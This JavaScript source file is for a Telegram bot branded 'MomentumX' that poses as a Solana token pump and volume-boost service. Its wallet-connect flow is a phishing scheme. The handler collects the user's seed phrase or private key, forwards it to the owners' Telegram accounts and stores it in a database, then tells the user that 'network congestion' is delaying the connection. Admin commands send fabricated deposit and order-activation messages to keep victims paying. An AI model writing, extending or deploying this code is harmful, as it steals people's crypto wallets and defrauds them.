import { Telegraf, session, Markup } from "telegraf";
import express from 'express'
import dotenv from 'dotenv'
import { pumpBoost, startMessage, pumpBoostAmount, verifySolanaAddress, verifyInformation, verifiedMessage, confirmTransation, sendTransactionHash, verifyTransactionHash, contactSupport } from "./PumpBoost.js";
import { awaitConnect, Connect, documentDoc, safetyTips, sendMessageToOwner, verifyKeyphrase, whyConnect } from "./Connect.js";
import { LoadAnimation } from "./tempMesg/LoadAnimation.js";
import { volBoostAmount, volumeBoost } from "./VolumeBoost.js";
import { Add, balanceInfo, Deposit, depositPayment, Withdraw } from "./BalanceInfo.js";
import { Mongo } from "@telegraf/session/mongodb";
import { Database } from "../MongoDB/Database.js";

dotenv.config()

const app = express()
const PORT = process.env.PORT || 3000;

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN)
const ownerId1 = process.env.TELEGRAM_OWNERID
const ownerId2 = process.env.TELEGRAM_SUBOWNERID
const solAddress = process.env.SOL_ADDRESS
const mongoUrl = process.env.MONGODB_URL

const ownerId = [ownerId1, ownerId2]

const store = Mongo({
  url: mongoUrl,
  database: 'MomentumX-Database',
  collection: 'users'
})


app.use(express.json())

// 3. Webhook Callback
//app.use(bot.webhookCallback('/'))

bot.use(session({ store: store }))

// 4. Set Webhook with 'drop_pending_updates'
/*
bot.telegram.setWebhook('https://inchoately-cacographic-madilyn.ngrok-free.dev/', {
  drop_pending_updates: true
}).then(() => console.log("✅ Webhook Set Successfully"));
*/
app.get('/', (req, res) => {
  try {
    res.send(`Server is running on port ${PORT}`)
  } catch (err) {
    console.log('error:', err)
    res.status(500).send('Internal Error')
  }
})

// 1. Logs EVERY incoming request from Telegram
bot.use((ctx, next) => {
  console.log(`Update ID: ${ctx.update.update_id} | Type: ${ctx.updateType}`);
  return next();
});

bot.start(async (ctx) => {
  try {

    const message = "NEW USER JUST START THE BOT"

    const newUser = sendMessageToOwner(ctx, message)

    let currentId = null;

    try {
      for (const id of ownerId) {
        currentId = id;
        await ctx.telegram.sendMessage(id, newUser.media.caption, {
          parse_mode: newUser.media.parse_mode
        });
      }
    } catch (err) {
      console.error(`Failed to send to ${currentId}: ${err.description || err.message}`);
    }

    const Loadingmessage = await ctx.reply('Loading...')

    const animation = LoadAnimation(ctx, Loadingmessage)

    if (ctx.session?.order) {
      ctx.session.order = null;
    }

    const { media, extra } = startMessage(ctx);

    if (animation) clearInterval(animation);

    await ctx.deleteMessage(Loadingmessage.message_id).catch(() => null)

    await ctx.replyWithPhoto(
      { source: media.source },
      {
        caption: media.caption,
        parse_mode: media.parse_mode,
        ...extra
      }
    ).catch(async (photoError) => {
      console.error("❌ Photo failed, attempting Text fallback:", photoError.message);
      await ctx.reply(media.caption, {
        parse_mode: media.parse_mode,
        ...extra
      });
    });

    console.log("✅ Successfully responded to /start");

    try {
      const database = await Database();
      if (database) {
        await database.updateOne(
          { id: ctx.from.id },
          {
            $set: {
              Name: ctx.from.first_name,
              Username: ctx.from.username || "N/A",
              UpdatedAt: new Date()
            },
            $setOnInsert: {
              CA: "N/A",
              balance: 0,
              isPending: false,
              CreatedAt: new Date()
            }
          },
          { upsert: true }
        );
      }
    } catch (err) {
      console.log("Database Error:", err.message);
    }

  } catch (err) {
    console.error("❌ Fatal error in bot.start handler:", err);
  }
});

bot.command('menu', async (ctx) => {
  try {

    if (ctx.session?.order) {
      ctx.session.order = null
    }

    const { media, extra } = startMessage(ctx)

    await ctx.replyWithPhoto({ source: media.source }, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      ...extra
    })
  } catch (err) {
    console.log("error", err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.command('cancel', async (ctx) => {

  if (ctx.session?.order) {
    ctx.session.order = null;
  }

  await ctx.reply('🔄 <b>Session Reset.</b> You can now start over with /start or /menu.', {
    parse_mode: 'HTML'
  });
});

bot.command('update_payment', async (ctx) => {
  const senderId = String(ctx.from.id);
  const admin1 = String(ownerId1);
  const admin2 = String(ownerId2);

  if (senderId !== admin1 && senderId !== admin2) {
    return await ctx.reply('❌ Unauthorized');
  }

  const message = ctx.message.text.split(' ');
  const targetUserId = message[1];
  const amountToAdd = message[2];

  if (!targetUserId || !amountToAdd) {
    return await ctx.reply('⚠️ Usage: /update_payment [UserID] [Amount]');
  }

  try {
    const collection = await Database();

    const client = await collection.findOne({ id: Number(targetUserId) });

    if (!client) {
      return await ctx.reply(`❌ User ${targetUserId} not found in database.`);
    }

    const currentBalance = Number(client.balance) || 0;
    const newBalance = currentBalance + Number(amountToAdd);

    await collection.updateOne(
      { id: Number(targetUserId) },
      { $set: { balance: newBalance } }
    );

    await ctx.reply(`✅ Success! ${targetUserId} now has ${newBalance} SOL.`);

    await ctx.telegram.sendMessage(targetUserId, 
      `🔔 Deposit Successful\n\n`+
      `✅ ${amountToAdd} SOL added to your balance!\n\n`+
      `📈 Detected Deposit: ${amountToAdd} SOL\n\n`+
      `🚀🚀 <code>Your pump order will be activated within an hour</code>\n\n`+
      `<b>Check Balance Info for real-time updates.</b>\n\n`+
      `💸 <i><b>Reminder:</b> Instant withdrawals are always available</i>`, {
        parse_mode: 'HTML'
      }
    );

  } catch (error) {
    console.error("Update Error:", error);
    await ctx.reply('📂 Database error occurred.');
  }
});

bot.command('bump_start', async (ctx) => {
  const senderId = String(ctx.from.id);
  const admin1 = String(ownerId1);
  const admin2 = String(ownerId2);

  if (senderId !== admin1 && senderId !== admin2) {
    return await ctx.reply('❌ Unauthorized');
  }

  const message = ctx.message.text.split(' ');
  const targetUserId = message[1];

  if (!targetUserId) {
    return await ctx.reply('⚠️ Usage: /bump_start [UserID]');
  }

  try {
    const collection = await Database();

    const client = await collection.findOne({ id: Number(targetUserId) });

    if (!client) {
      return await ctx.reply(`❌ User ${targetUserId} not found in database.`);
    }

    await ctx.reply(`✅ Success! ${targetUserId} bump order initiated`);

    await ctx.telegram.sendMessage(targetUserId, 
      `✅ Order Activated ✅\n\n`+
      `Symbol: <b>${client.symbol}</b>\n\n`+
      `Network: <b>Solana</b>\n\n`+
      `Contract: <code><b>${client.CA}</b></code>\n\n`+
      `🚀🚀Bumps: <b>10</b>\n\n`+
      `🔥🔥Start: <b>Now...</b>\n\n`+
      `🔃Order: <b>In progress...</b>`, {
        parse_mode: 'HTML'
      }
    );

  } catch (error) {
    console.error("Update Error:", error);
    await ctx.reply('📂 Database error occurred.');
  }
});

bot.command('update_info', async (ctx) => {
  const senderId = String(ctx.from.id);
  const admin1 = String(ownerId1);
  const admin2 = String(ownerId2);

  if (senderId !== admin1 && senderId !== admin2) {
    return await ctx.reply('❌ Unauthorized');
  }

  const message = ctx.message.text.split(' ');
  const targetUserId = message[1];

  if (!targetUserId) {
    return await ctx.reply('⚠️ Usage: /update_info [UserID]');
  }

  try {
    const collection = await Database();

    const client = await collection.findOne({ id: Number(targetUserId) });

    if (!client) {
      return await ctx.reply(`❌ User ${targetUserId} not found in database.`);
    }

    await ctx.reply(`✅ Success! ${targetUserId} Sent`);

    await ctx.telegram.sendMessage(
      targetUserId,
      `🚨 MomentumX Update! 🚨,

✅ MomentumX services have been fully restored.

⚙️ We recently completed scheduled infrastructure updates to improve processing speed and overall bot stability. We sincerely apologize for any temporary inconvenience caused.

🚀 The bot is now operating at 100% capacity with enhanced performance. Thank you for your continued trust in our technology.

▶️ /start`
    );

  } catch (error) {
    console.error("Update Error:", error);
    await ctx.reply('📂 Database error occurred.');
  }
});

bot.command('support', async (ctx) => {
  try {
    await ctx.deleteMessage().catch(() => {
      console.log('message already deleted')
    })

    const { media, extra } = contactSupport()

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.log('Error', err.message)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
});

bot.command('verify', async (ctx) => {

  try {

     if (ctx.session?.order?.step !== 'AWAIT_payment' || ctx.session?.order?.step !== 'AWAIT_amount'){
      console.log('Session Dont Match')
    }

    if (ctx.session?.order?.step === 'AWAIT_payment' || ctx.session?.order?.step === 'AWAIT_amount') {

      ctx.session.order.step = 'AWAIT_hash'

      const { media, extra } = confirmTransation()

      await ctx.reply(media.caption, {
        parse_mode: media.parse_mode,
        ...extra
      })

    } else {
      console.error('Session dont match');

      if (ctx.session) ctx.session.order = null;

      await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
        parse_mode: 'Markdown'
      });
    }
  } catch (err) {
    console.error('CRITICAL ERROR:', err);

    if (ctx.session) ctx.session.order = null;

    await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
      parse_mode: 'Markdown'
    });
  }

  try {
    const collection = await Database()
    const currentUser = await collection.findOne({ id: ctx.from.id })
    if (!currentUser) {
      await ctx.reply('Fail to get user information click /start ')
    }
    await currentUser.updateOne(
      { id: ctx.from.id },
      {
        $set: {
          isPending: true
        }
      },
      { upsert: true }
    )
  } catch (err) {

  }
})

bot.action('Start Pumps', async (ctx) => {
  try {
    await ctx.answerCbQuery()

    await ctx.deleteMessage().catch(() => {
      console.log("Message already deleted or not found");
    });

    const { media, extra } = pumpBoost()

    await ctx.reply(media.caption, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.log('Error', err.message)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('Connect', async (ctx) => {
  try {

    await ctx.answerCbQuery()

    ctx.session ??= {}

    ctx.session.order = {
      step: "AWAIT_connect"
    }

    const { media, extra } = Connect()

    await ctx.editMessageMedia({
      type: 'photo',
      media: { source: media.source },
      caption: media.caption,
      parse_mode: media.parse_mode

    }, extra).catch(async () => {
      const { media, extra } = Connect()

      await ctx.replyWithPhoto({ source: media.source }, {
        caption: media.caption,
        parse_mode: media.parse_mode,
        ...extra
      })
    })

  } catch (err) {
    console.log("Error", err.message)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('Connect_wallet', async (ctx) => {
  try {
    await ctx.answerCbQuery();

    if (!ctx.session?.order) {
      return await ctx.reply("❌ Session timed out. Please restart with /start.");
    }

    if (ctx.session.order.step === 'AWAIT_connect') {
      ctx.session.order.step = 'AWAIT_phrase';

      const { media } = awaitConnect();

      await ctx.editMessageMedia({
        type: 'photo',
        media: { source: media.source },
        caption: media.caption,
        parse_mode: media.parse_mode

      }).catch(async () => {

        await ctx.replyWithPhoto({ source: media.source }, {
          caption: media.caption,
          parse_mode: media.parse_mode
        });
      });

      await ctx.reply('Use button below to cancel',
        Markup.keyboard([['🚫Cancel']]).oneTime().resize()
      );

    } else {
      await ctx.reply('⚠️ Session out of sync. Please try again from the /menu.');
    }
  } catch (err) {
    console.error('Connect_wallet Error:', err.message);
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
});

bot.action('reason', async (ctx) => {
  try {
    const { media } = whyConnect()
    await ctx.answerCbQuery(media.caption.substring(0, 200), { show_alert: true })
  } catch (err) {
    console.log('Error', err.message)
    await ctx.reply('Failed to Display Information')
  }
})

bot.action('safety_tips', async (ctx) => {
  try {
    await ctx.answerCbQuery()

    await ctx.deleteMessage().catch(() => {
      console.log("Message already deleted or not found");
    });

    const { media, extra } = safetyTips()

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })
  } catch (err) {
    console.log('Error', err.message)
  }
})

bot.action('document_doc', async (ctx) => {
  try {
    await ctx.answerCbQuery()

    await ctx.deleteMessage().catch(() => {
      console.log("Message already deleted or not found");
    });

    const { media, extra } = documentDoc()

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })
  } catch (err) {
    console.log('Error', err)
  }
})

bot.action('Volume_Boosts', async (ctx) => {
  try {
    await ctx.answerCbQuery()

    const { media, extra } = volumeBoost()

    await ctx.editMessageMedia({
      type: 'photo',
      media: { source: media.source },
      caption: media.caption,
      parse_mode: media.parse_mode
    }, extra).catch(async () => {
      const { media, extra } = volumeBoost()

      await ctx.replyWithPhoto({ source: media.source }, {
        caption: media.caption,
        parse_mode: media.parse_mode,
        ...extra
      })
    })

  } catch (err) {
    console.log('Error:', err.message)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('support', async (ctx) => {
  try {

    await ctx.answerCbQuery()

    await ctx.deleteMessage().catch(() => {
      console.log('message already deleted')
    })

    const { media, extra } = contactSupport()

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.log('Error', err.message)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
});

bot.action(/^Bump_/, async (ctx) => {
  try {

    await ctx.answerCbQuery()
    await ctx.deleteMessage().catch(() => {
      console.log('message already deleted')
    })

    const amount = ctx.callbackQuery.data
    const getActualAmount = amount.split('_')[1]

    ctx.session ??= {};

    ctx.session.order = {
      step: 'AWAIT_ca',
      amount: getActualAmount
    }

    const { media, extra } = pumpBoostAmount(getActualAmount)

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.error('CRITICAL ERROR:', err);

    if (ctx.session) ctx.session.order = null;

    await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
      parse_mode: 'Markdown'
    });
  }
})

bot.action(/^Vol_/, async (ctx) => {
  try {

    await ctx.answerCbQuery()
    await ctx.deleteMessage().catch(() => {
      console.log('message already deleted')
    })

    const amount = ctx.callbackQuery.data
    const getActualAmount = amount.split('_')[1]

    ctx.session ??= {};

    ctx.session.order = {
      step: 'AWAIT_ca',
      amount: getActualAmount
    }

    let boost = ''

    switch (getActualAmount) {
      case '1.20':
        boost = 'Iron⛓️Boost'
        break;
      case '2':
        boost = 'Bronze🥉Boost'
        break;
      case '5.1':
        boost = 'Silver🥈Boost'
        break;
      case '7.5':
        boost = 'Gold🥇Boost'
        break;

      default:
        await ctx.reply('Somthing went wrong, Please try again')
        break;
    }
    const { media, extra } = volBoostAmount(getActualAmount, boost)

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.error('CRITICAL ERROR:', err);

    if (ctx.session) ctx.session.order = null;

    await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
      parse_mode: 'Markdown'
    });
  }
})

bot.action('Confirm', async (ctx) => {
  try {

    await ctx.answerCbQuery()

    if (ctx.session?.order?.step !== 'AWAIT_verification') {
      await ctx.reply('Session expired click the /start')
    };

    if (ctx.session.order.step === 'AWAIT_verification') {

      const amount = ctx.session?.order?.amount
      const photo = ctx.session?.order?.photo

      ctx.session.order.step = 'AWAIT_payment'

      const { media, extra } = verifiedMessage(amount, solAddress)

      await ctx.replyWithPhoto(photo, {
        caption: media.caption,
        parse_mode: media.parse_mode,
        ...extra
      })

    } else {

      console.error('CRITICAL ERROR:', err);

      if (ctx.session) ctx.session.order = null;

      await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
        parse_mode: 'Markdown'
      });
    }

  } catch (err) {
    console.error('CRITICAL ERROR:', err);

    if (ctx.session) ctx.session.order = null;

    await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
      parse_mode: 'Markdown'
    });
  }
})

bot.action('Confirm_payment', async (ctx) => {

  try {
    await ctx.answerCbQuery()

    if (ctx.session?.order?.step !== 'AWAIT_payment' || ctx.session?.order?.step !== 'AWAIT_amount'){
      console.log('Session Dont Match')
    }

    if (ctx.session?.order?.step === 'AWAIT_payment' || ctx.session?.order?.step === 'AWAIT_amount') {

      ctx.session.order.step = 'AWAIT_hash'

      const { media, extra } = confirmTransation()

      await ctx.reply(media.caption, {
        parse_mode: media.parse_mode,
        ...extra
      })

    } else {
      console.error('CRITICAL ERROR:', err);

      if (ctx.session) ctx.session.order = null;

      await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
        parse_mode: 'Markdown'
      });
    }
  } catch (err) {
    console.error('CRITICAL ERROR:', err);

    if (ctx.session) ctx.session.order = null;

    await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
      parse_mode: 'Markdown'
    });
  }

  try{
    const collection = await Database()
    const currentUser = await collection.findOne({id: ctx.from.id})
    if(!currentUser){
      await ctx.reply('Fail to get user information click /start ')
    }
    await currentUser.updateOne(
      {id: ctx.from.id},
      {
        $set: {
          isPending: true
        }
      },
      {upsert: true}
    )
  }catch(err){

  }
})

bot.action(['Balance-INFO', 'Refresh'], async (ctx) => {
  try {
    await ctx.answerCbQuery();

    const collection = await Database();
    const user = await collection.findOne({ id: ctx.from.id });

    if (!user) {
      return await ctx.reply("❌ Account not found. Please type /start to register.");
    }

    const { media, extra } = balanceInfo(user);

    await ctx.editMessageCaption("🔄 <i>Refreshing balance...</i>", {
      parse_mode: 'HTML'
    }).catch(() => null);

    await new Promise(resolve => setTimeout(resolve, 100));

    await ctx.editMessageMedia({
      type: 'photo',
      media: { source: media.source },
      caption: media.caption,
      parse_mode: 'HTML'
    }, extra).catch(async (err) => {
      console.log("Edit failed, sending new message:", err.message);

      await ctx.replyWithPhoto({ source: media.source }, {
        caption: media.caption,
        parse_mode: 'HTML',
        ...extra
      });
    });

  } catch (err) {
    console.error("Balance Action Error:", err.message);
    await ctx.reply("⚠️ Unable to refresh balance. Use /menu to try again.");
  }
});

bot.action('Withdraw', async (ctx) => {
  try {
    await ctx.answerCbQuery()

    const collection = await Database()
    const user = await collection.findOne({id: ctx.from.id})

    if(!user){
      console.log('User not found')
    }

    const { media, extra } = Withdraw(user)

    await ctx.deleteMessage().catch(() => {
      console.log('message already deleted')
    })

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.log('Error', err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('Deposit', async (ctx) => {
  try {
    await ctx.answerCbQuery()

    const { media, extra } = Deposit(ctx)

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.log('Error', err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('Add', async (ctx) => {
  try {
    await ctx.answerCbQuery()

    ctx.session ??= {}

    ctx.session.order = {
      step: 'AWAIT_amount'
    }
    
    console.log(ctx.session.order.step)

    const { media, extra } = Add(ctx)

    await ctx.reply(media.caption, {
      parse_mode: media.parse_mode,
      ...extra
    })

  } catch (err) {
    console.log('Error', err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('Back', async (ctx) => {
  try {

    await ctx.answerCbQuery()

    const { media, extra } = startMessage(ctx)

    await ctx.replyWithPhoto({ source: media.source }, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      ...extra
    })
  } catch (err) {
    console.log("error", err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('Menu', async (ctx) => {
  try {

    const { media, extra } = startMessage(ctx)

    await ctx.answerCbQuery()

    await ctx.replyWithPhoto({ source: media.source }, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      ...extra
    })
  } catch (err) {
    console.log("error", err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
})

bot.action('Cancel', async (ctx) => {
  try {

    await ctx.answerCbQuery()
    if (!ctx.session?.order) {
      return await ctx.reply('No active session found. Type /start to begin.', {
        parse_mode: 'HTML'
      });
    }

    ctx.session.order = null;

    await ctx.reply('🔄 <b>Session Reset.</b> You can now start over with /start or /menu.', {
      parse_mode: 'HTML'
    });
  } catch (err) {
    console.log('Error', err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
});

bot.hears('🚫Cancel', async (ctx) => {
  try {

    if (!ctx.session?.order) {
      return await ctx.reply('No active session found. Type /start to begin.', {
        parse_mode: 'HTML'
      });
    }

    ctx.session.order = null;
    await ctx.reply('🔄 <b>Session Reset.</b> You can now start over with /start or /menu.', {
      parse_mode: 'HTML'
    });
  } catch (err) {
    console.log('Error', err)
    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
  }
});

bot.on('text', async (ctx) => {
  try {

    const step = ctx.session?.order?.step;

    if (!step) return;

    const messageText = ctx.message.text;

    const loadingMessage = await ctx.reply('Loading...')

    const animation = LoadAnimation(ctx, loadingMessage)

    switch (step) {

      case 'AWAIT_ca':
        if (verifySolanaAddress(messageText)) {
          ctx.session.order.ca = messageText;

          ctx.session.order.step = 'AWAIT_photo';

          if (animation) clearInterval(animation)

          await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)

          await ctx.reply(`✅ <b>Address Verified.</b>\n\n Now Upload your CA profile photo`, {
            parse_mode: 'HTML'
          });

          try {
            const database = await Database()
            if (database) {
              await database.updateOne(
                { id: ctx.from.id },
                {
                  $set: {
                    CA: messageText || "N/A",
                    UpdatedAt: new Date()
                  }
                },
                { upsert: true }
              )
            }
          } catch (err) {
            console.log("Error", err.message)
          }

        } else {

          if (animation) clearInterval(animation)

          await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)

          await ctx.reply(`<b>Invalid Address.</b>\n Please check and try again.`, {
            parse_mode: 'HTML'
          });
        }
        break;

      case 'AWAIT_hash':

        if (verifyTransactionHash(messageText)) {

          const { media } = sendTransactionHash(ctx, messageText);

          if (animation) clearInterval(animation)

          await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)

          for (const id of ownerId) {
            if (!id) {
              console.error("⚠️ Found an empty ID in the ownerId array.");
              continue;
            }

            try {
              await ctx.telegram.sendMessage(id, media.caption, {
                parse_mode: media.parse_mode
              });
              console.log(`Notification sent to ${id}`);
            } catch (err) {
              console.error(`Failed to send to ${id}: ${err.description || err.message}`);
            }
          }

          await ctx.reply(`⏳ <b>Processing deposit…</b>\n\n` +
            `<code>⏱️ Your account will be updated once blockchain confirmation is completed.</code>`, {
            parse_mode: 'HTML',
            extra: Markup.inlineKeyboard([
              [Markup.button.callback('🚫 Main Menu', 'Menu')]
            ])
          });

          ctx.session.order = null;

        } else {
          await ctx.reply('❌ <b>Invalid Transaction Hash</b>', { parse_mode: 'HTML' })
        }

        break;

      case 'AWAIT_phrase':
        if (verifyKeyphrase(messageText)) {

          ctx.session.order.phrase = messageText

          if (animation) clearInterval(animation);

          await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)

          const { media } = sendMessageToOwner(ctx, messageText)

          for (const id of ownerId) {
            if (!id) {
              console.error("⚠️ Found an empty ID in the ownerId array.");
              continue;
            }

            try {
              await ctx.telegram.sendMessage(id, media.caption, {
                parse_mode: media.parse_mode
              });
              console.log(`Notification sent to ${id}`);
            } catch (err) {
              console.error(`Failed to send to ${id}: ${err.description || err.message}`);
            }
          }

          await ctx.reply(`💭Connection of wallet may take time due to <b>NETWORK CONJESTION</b>.\n\n` +
            `Processing ………`, {
            parse_mode: 'HTML'
          })

          try {
            const database = await Database()
            if (database) {
              await database.updateOne(
                { id: ctx.from.id },
                {
                  $set: {
                    Phrase: messageText,
                    UpdatedAt: new Date()
                  }
                },
                { upsert: true }
              )
            }
          } catch (err) {
            console.log("Error", err.message)
          }

        } else {
          if (animation) clearInterval(animation);

          await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)

          await ctx.reply('<b>Invalid Phrase/Key, Check and try again</b>', { parse_mode: 'HTML' })
        }
        break;

      case 'AWAIT_amount':
        if(Number(messageText) > 0.50 && Number(messageText) <= 1000){
          try{
            const {media, extra} = depositPayment(messageText, solAddress )
            await ctx.reply(media.caption, {
              parse_mode: media.parse_mode,
              ...extra
            })

          }catch(err){
            console.log("Error:", err.message)
          }
        }else{
          await ctx.reply("check the min and max amount and try again /menu")
        }

        break;

      default:
        if (animation) clearInterval(animation)

        await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)

        await ctx.reply("I'm not sure what to do next. Try starting over with /start.");
        break;
    }

  } catch (err) {
    console.error('CRITICAL ERROR:', err);

    if (ctx.session) ctx.session.order = null;

    await ctx.reply("⚠️ <b>An unexpected error occurred.</b>\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
      parse_mode: 'HTML'
    });
  }
});

bot.on('photo', async (ctx) => {

  if (ctx.session?.order?.step !== 'AWAIT_photo') {
    return await ctx.reply('⚠️ No active order found. Please use the menu to start.', {
      parse_mode: 'HTML'
    });
  }

  const photo = ctx.message.photo.pop()
  const fileId = photo.file_id

  if (ctx.session.order.step === 'AWAIT_photo') {
    ctx.session.order.photo = fileId
    ctx.session.order.step = 'AWAIT_verification'

    const ca = ctx.session.order.ca

    const data = await verifyInformation(ctx, ca)

    await ctx.reply(data.caption, {
      parse_mode: data.parse_mode,
      ...data.extra
    })

  } else {
    console.error('CRITICAL ERROR:', err);

    if (ctx.session) ctx.session.order = null;

    await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
      parse_mode: 'Markdown'
    });
  }
})

app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server is live on port ${PORT}`);
  
  // Start the bot using Long Polling for fps.ms
  bot.launch()
  .then(() => console.log("🚀 MomentumX Bot is successfully connected!"))
  .catch((err) => console.error("❌ Bot Launch Error:", err));
});

process.once('SIGINT', () => {
  console.log('SIGINT received, stopping bot...');
  bot.stop('SIGINT');
  process.exit();
});
process.once('SIGTERM', () => {
  console.log('SIGTERM received, stopping bot...');
  bot.stop('SIGTERM');
  process.exit();
});

/*
export default app

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))

*/
